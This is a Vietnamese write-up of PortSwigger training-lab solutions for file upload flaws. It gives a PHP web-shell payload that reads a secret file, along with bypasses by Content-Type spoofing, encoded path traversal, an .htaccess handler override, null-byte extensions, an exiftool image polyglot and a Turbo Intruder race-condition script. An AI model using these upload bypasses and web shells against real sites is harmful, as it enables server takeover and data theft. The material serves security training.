# 1. Remote code execution via web shell upload
Ta thấy chức năng upload avatar cho phép ta upload bất kì loại file nào. Như vậy ta thử upload file payload.php với nội dung:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Sau khi upload file, ta truy cập `/files/avatars/payload.php` thì thấy nội dung file /home/carlos/secret đã được hiển thị:

![image](https://user-images.githubusercontent.com/103978452/202854734-8fa1c18b-4117-4a3c-b75e-547b67b16588.png)

# 2. Web shell upload via Content-Type restriction bypass
Khi upload file có đuôi .php thì website trả về lỗi, thông báo rằng chỉ cho phép uplaod file với MIME type image/jpeg hoặc image/png.

Ta thử upload file payload.php với nội dung:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
rồi thay đổi Content-Type từ `application/x-php` thành `image/jpeg` rồi submit (sử dụng Burp Repeater)

Kết quả thành công. Ta truy cập `/files/avatars/payload.php` thì thấy nội dung file /home/carlos/secret được hiển thị

![image](https://user-images.githubusercontent.com/103978452/202857559-21ced5bd-38e0-47f0-a627-0b64162b40f7.png)

# 3. Web shell upload via path traversal
Ta thử upload file payload.php với nội dung
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
rồi truy cập `/files/avatars/payload.php` thì thấy nội dung file được hiển thị thay vì được execute. Ta sẽ thử upload file payload.php vào các folder khác sử dụng kĩ thuật directory traversal.

Trong tab Repeater của BurpSuite, ta thấy POST request đến `/my-account/avatar` có nội dung như sau:

![image](https://user-images.githubusercontent.com/103978452/202960724-6834b606-d122-43ba-8f10-b716b5a1f5f9.png)

Thay đổi `filename="../payload.php"`, kết quả trả về `The file avatars/payload.php has been uploaded`. Thử với các relative path, absolute path khác cũng có kết quả tương tự. Như vậy có thể server lọc ra filename trước rồi mới upload.

Thử dùng URL encode, thay `filename="%2E%2E%2F%70%61%79%6C%6F%61%64%2E%70%68%70"` (tương ứng `payload="../payload.php` sau khi decode) thì thấy kết quả trả về thành công

![image](https://user-images.githubusercontent.com/103978452/202961066-81908b20-efee-4af1-8076-2c0754a00c5b.png)

Truy cập `/files/payload.php`, ta thấy đoạn code được execute và trả về nội dung file /home/carlos/secret

![image](https://user-images.githubusercontent.com/103978452/202961174-fed4b7c5-a005-4096-b909-b56917ff110d.png)

# 4. Web shell upload via extension blacklist bypass
Ta thấy server đã chặn các file có đuôi .php. Thử sử dụng các kỹ thuật để obfuscate file extension, kết quả không thành công

Ta thử bypass bằng cách upload file `.htaccess` với nội dung:
```
AddType application/x-httpd-php .jpg
```
File này sẽ cấu hình server cho phép chạy các file có đuôi .jpg như một file php

![image](https://user-images.githubusercontent.com/103978452/203673325-04ed4e21-1fcb-466d-b8a7-13d0386969ac.png)

Kết quả upload file thành công. Ta tiếp tục upload file `payload.jpg` với nội dung:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Sau đó truy cập `/files/avatars/payload.jpg`, kết quả thu được nội dung file cần tìm.

![image](https://user-images.githubusercontent.com/103978452/203673682-3cca7ead-61ec-48b3-954c-9212adc7ea37.png)

# 5. Web shell upload via obfuscated file extension
Ta upload file `payload.php` với nội dung:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
thì server trả về thông báo lỗi: "Sorry, only JPG & PNG files are allowed"

Ta thay đổi filename thành `payload.php%00.jpg` rồi submit, kết quả thành công.

Truy cập `/files/avatars/payload.php` thu được nội dung file cần tìm

![image](https://user-images.githubusercontent.com/103978452/203674340-7274dfef-a47e-4a9d-82c6-3e832485c6c6.png)

# 6. Remote code execution via polyglot web shell upload
Ta upload file `payload.php` thì thấy server trả về `Error: file is not a valid image`.

Dùng ExifTool để chèn một đoạn php vào trong file image `naruto.jpg` với lệnh:
```
exiftool -DocumentName="<h1>HELLO</h1><?php echo file_get_contents('/home/carlos/secret'); ?>" naruto.jpg
```
Sau đó đổi tên file thành `naruto.php` và upload lên website. Kết quả trả về thành công. Dùng BurpSuite để bắt request, ta thấy trong nội dung file có chứa đoạn code đã được inject

![image](https://user-images.githubusercontent.com/103978452/203678647-73fc07b3-f7f7-43df-99c5-e64a5bbbf57d.png)

Thử truy cập `/files/avatars/naruto.php` thì server trả về lỗi `500 Internal Server Error`. Như vậy có khả năng trong phần thân image có các kí tự đặc biệt như `<?` khiến cho đoạn code bị lỗi. Ta dùng lệnh `__halt_compiler() ?>` để các đoạn code bên dưới không được execute. Như vậy injected code sẽ là:
```
<h1>HELLO</h1><?php echo file_get_contents('/home/carlos/secret'); __halt_compiler();
```
Sau khi upload, truy cập `/files.avatars/naruto.php`, kết quả trả về nội dung file mong muốn.

![image](https://user-images.githubusercontent.com/103978452/203678976-af5de655-ed73-404e-a818-fb4515bea3ca.png)

# 6. Web shell upload via race condition

![image](https://user-images.githubusercontent.com/103978452/203904330-baaa8f18-b26b-48c4-b2f7-af3e92df0bbc.png)

```
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10
                           )

    request1 = ""\
    "POST /my-account/avatar HTTP/1.1\r\n"\
    "Host: 0a38005f043e0b4fc00810a800d10038.web-security-academy.net\r\n"\
    "Cookie: session=ySDNtxlS5Wf6y787ddzTzA37th5v6ZJa\r\n"\
    "Content-Length: 470\r\n"\
    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
    "Connection: close\r\n"\
    "\r\n"\
    "------WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
    "Content-Disposition: form-data; name=\"avatar\"; filename=\"payload.php\"\r\n"\
    "Content-Type: application/x-php\r\n"\
    "\r\n"\
    "<?php\r\n"\
    "echo file_get_contents('/home/carlos/secret');\r\n"\
    "?>\r\n"\
    "\r\n"\
    "------WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
    "Content-Disposition: form-data; name=\"user\"\r\n"\
    "\r\n"\
    "wiener\r\n"\
    "------WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
    "Content-Disposition: form-data; name=\"csrf\"\r\n"\
    "\r\n"\
    "QqXQoJAoGQxRfzIRVavqp4OP9zsCom7V\r\n"\
    "------WebKitFormBoundaryCsL5cCjpW6YxOEmG--\r\n\r\n\r"

    request2 = ""\
    "GET /files/avatars/payload.php HTTP/1.1\r\n"\
    "Host: 0a38005f043e0b4fc00810a800d10038.web-security-academy.net\r\n"\
    "Cookie: session=ySDNtxlS5Wf6y787ddzTzA37th5v6ZJa\r\n"\
    "Connection: close\r\n\r\n"

    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race2')

    engine.openGate('race1')
    engine.openGate('race2')
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
